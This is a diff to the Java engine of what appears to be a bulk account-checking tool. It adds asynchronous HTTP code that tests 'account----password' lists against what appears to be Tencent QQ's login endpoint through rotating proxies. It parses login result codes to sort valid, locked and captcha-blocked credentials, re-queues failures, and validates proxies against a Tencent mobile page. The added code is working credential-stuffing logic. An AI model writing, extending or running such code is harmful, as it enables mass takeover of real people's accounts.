@@ -44,10 +44,16 @@ import javax.management.remote.JMXConnectorServer;
 import javax.management.remote.JMXConnectorServerFactory;
 import javax.management.remote.JMXServiceURL;
 
+import org.apache.http.HttpEntity;
+import org.apache.http.HttpResponse;
+import org.apache.http.client.config.RequestConfig;
+import org.apache.http.client.methods.HttpGet;
 import org.apache.http.client.methods.HttpPost;
+import org.apache.http.concurrent.FutureCallback;
 import org.apache.http.entity.StringEntity;
-import org.apache.http.impl.client.DefaultHttpClient;
-import org.apache.http.params.CoreConnectionPNames;
+import org.apache.http.impl.nio.client.CloseableHttpAsyncClient;
+import org.apache.http.impl.nio.client.HttpAsyncClients;
+import org.apache.http.util.EntityUtils;
 
 import ws.hoyland.security.ClientDetecter;
 import ws.hoyland.sm.Engine;
@@ -86,7 +92,6 @@ public class Engine extends Observable {
 
 	private Registry registry = null;
 
-
 	private Stack<String> infq = null;
 	//private boolean tf = true;//是否执行timer
 	
@@ -98,6 +103,7 @@ public class Engine extends Observable {
 	private static String modBytes = "C39A51FB1202F75F0E20F691C8E370BCFA7CD2B75FD588CADAC549ADF1F03CFDAACCB9FBA5D7219CA4A3E40F9324121474BE85355CF178E0D3BD0719EDF859D60D24874B105FAC73EF067DEE962F5D12C7DB983039BA5EE0183479923174886A2C45ACFD5441C1B2FCC2083952016C66631884527585FF446BBC4F75606EF87B";
 	private static DateFormat format = new java.text.SimpleDateFormat("[yyyy/MM/dd HH:mm:ss] ");
 	
+	private static CloseableHttpAsyncClient client = HttpAsyncClients.createDefault();
 	
 	private Engine() {
 		System.err.println(xpath);
@@ -220,6 +226,12 @@ public class Engine extends Observable {
 		System.err.println("running="+running);
 		
 		try{
+			client.close();
+		}catch(Exception e){
+			e.printStackTrace();
+		}
+		
+		try{
 			if(registry!=null){
 				UnicastRemoteObject.unexportObject(registry, true);
 			}
@@ -312,12 +324,16 @@ public class Engine extends Observable {
 				@Override
 				public void run() {
 					HttpPost post = null;
-					DefaultHttpClient client = null;
 					try{
-						client = new DefaultHttpClient();
-						client.getParams().setParameter(
-								CoreConnectionPNames.CONNECTION_TIMEOUT, 4000);
-						client.getParams().setParameter(CoreConnectionPNames.SO_TIMEOUT, 4000);
+//						client.getParams().setParameter(
+//								CoreConnectionPNames.CONNECTION_TIMEOUT, 4000);
+//						client.getParams().setParameter(CoreConnectionPNames.SO_TIMEOUT, 4000);
+						
+						RequestConfig config = RequestConfig.custom()
+							 	.setSocketTimeout(4000)
+				                .setConnectTimeout(4000)
+				                .setConnectionRequestTimeout(4000)
+			                    .build();
 						
 						Crypter crypt = new Crypter();
 						byte[] mid = Converts.hexStringToByte(ClientDetecter
@@ -356,17 +372,16 @@ public class Engine extends Observable {
 						
 						post.setEntity(new StringEntity(sb.toString()));
 						
-						client.execute(post);
+						post.setConfig(config);
+						
+						client.execute(post, null);
 					}catch(Exception e){
 						e.printStackTrace();
 					}finally{
-						if(post!=null){
-							post.releaseConnection();
-							post.abort();
-						}
-						if(client!=null){
-							client.getConnectionManager().shutdown();
-						}
+//						if(post!=null){
+//							post.releaseConnection();
+//							post.abort();
+//						}
 					}
 				}			
 			}).start();
@@ -624,7 +639,8 @@ public class Engine extends Observable {
 				}
 			}
 			
-			//开始timer，原有位置
+			//开启client
+			client.start();
 			
 			//开启本地JMX，并向扫描服务端注册
 			
@@ -748,6 +764,8 @@ public class Engine extends Observable {
 												}
 												br.close();
 												
+												//TODO
+												//改成对异步的判断
 												while(poolx!=null&&poolx.getActiveCount()!=0){
 													try{
 														Thread.sleep(1000);
@@ -1048,4 +1066,142 @@ public class Engine extends Observable {
 		return instance;
 	}
 
+	public void execute(final String line, HttpGet request) {
+		try{
+			client.execute(request, new FutureCallback<HttpResponse>(){
+
+				public void cancelled() {
+					// TODO Auto-generated method stub
+					
+				}
+
+				public void completed(HttpResponse response) {
+					int id = 0;
+					String account = null;
+					String password = null;
+					
+					String[] ls = line.split("----");
+					try{
+						id = Integer.parseInt(ls[0]);
+						account = ls[1];
+						password = ls[2];
+					}catch(Exception e){
+						System.err.println(line);
+						e.printStackTrace();			
+					}
+					
+					HttpEntity entity = null;
+					String resp = null;
+					
+					try{
+						entity = response.getEntity();
+						resp = EntityUtils.toString(entity);
+						
+						if (resp.indexOf("pt.handleLoginResult") == -1)// 代理异常
+						{
+							addTask(line);
+							// System.out.println("A2");
+							// Engine.getInstance().removeProxy(proxy.getHostName()+":"+proxy.getPort());
+						} else {
+							// System.out.println("A3");
+							// bool ok = false;
+							if (resp.indexOf("," + account + ",0,") != -1) {
+								log(0, id, account + "----" + password);// account
+																							// +
+																							// " / "
+																							// +
+																							// proxy
+								// task.Abort();
+							} else if (resp.indexOf(",0,40010,") != -1) {
+								log(1, id,  account + "----" + password);
+								// task.Abort();
+							} else if (resp.indexOf(",0,40026,") != -1) {
+								log(2, id, account + "----" + password);
+								// task.Abort();
+							} else if (resp.indexOf("," + account + ",40001,") != -1)// 验证码
+							{
+								//System.err.println("adding "+line);
+								addTask(line);
+			
+								// 不离开当前任务
+								// Thread.Sleep(1000 *
+								// Int32.Parse(cfa.AppSettings.Settings["P_ITV"].Value));//N秒后继续
+							} else // 代理异常
+							{
+								addTask(line);
+								// System.out.println("A4");
+								// System.out.println("proxy="+proxy);
+								// Engine.getInstance().removeProxy(proxy.getHostName()+":"+proxy.getPort());
+							}
+						}
+					}catch(Exception e){
+						e.printStackTrace();
+					}finally{
+						try {
+							if (entity != null) {
+								EntityUtils.consume(entity);
+							}
+						} catch (Exception e) {
+							e.printStackTrace();
+						}
+					}				
+				}
+
+				public void failed(Exception e) {
+					// TODO Auto-generated method stub
+					addTask(line);
+				}
+				
+			});
+		}catch(Exception e){
+			e.printStackTrace();
+		}		
+	}
+
+	public void validate(final StringBuilder sb, final String line, HttpGet request) {
+		try{
+			client.execute(request, new FutureCallback<HttpResponse>(){
+
+				public void cancelled() {
+					// TODO Auto-generated method stub
+					
+				}
+
+				public void completed(HttpResponse response) {					
+					
+					HttpEntity entity = null;
+					String resp = null;
+					
+					try{
+						entity = response.getEntity();
+						resp = EntityUtils.toString(entity);
+						
+						if(resp.indexOf("手机腾讯网")!=-1){
+							synchronized(sb){
+								sb.append(line+"\r\n");
+							}
+						}
+					}catch(Exception e){
+						e.printStackTrace();
+					}finally{
+						try {
+							if (entity != null) {
+								EntityUtils.consume(entity);
+							}
+						} catch (Exception e) {
+							e.printStackTrace();
+						}
+					}				
+				}
+
+				public void failed(Exception e) {
+					// TODO Auto-generated method stub
+
+				}
+				
+			});
+		}catch(Exception e){
+			e.printStackTrace();
+		}		
+	}
 }
